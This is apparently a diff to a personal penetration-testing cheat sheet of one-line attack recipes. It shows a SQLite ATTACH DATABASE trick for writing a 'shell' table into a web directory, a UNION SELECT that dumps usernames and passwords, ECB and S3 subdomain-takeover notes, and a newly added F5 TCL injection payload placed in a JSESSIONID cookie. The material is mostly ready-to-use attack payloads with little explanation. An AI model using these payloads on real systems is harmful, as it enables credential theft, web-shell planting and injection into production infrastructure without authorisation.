@@ -20,6 +20,9 @@ Sqlite (Into Outfile equivalent)----"""ATTACH DATABASE '/home/devnull/public_htm
 	CREATE TABLE pwn.shell (code TEXT);
 	INSERT INTO pwn.shell (code) VALUES ("test");"""
 Multiple Columns in a Single Column----' UNION SELECT username || '~' || password FROM users--
+Allow login for user externally----
+
+
 
 ##Odds & Ends
 FireFox Browse Nonstandard Ports----about:config -- network.security.ports.banned.override (String &lt;port-num&gt;)
@@ -48,3 +51,5 @@ Attacking ECB----##1. Determine the key block size.  Increment the PT by one unt
 
 ##Cloud
 Domain Hijacking----Have 404s pointing to a S3 bucket?  Take over the subdomain!
+
+F5 TCL Injection (Send the following in JSESSIONID that doesn't respond typical JSESSIONID)----##JSESIONID=[TCP::respond [info level 0]];JSESSIONID=[TCP::respond {Hello ?}]
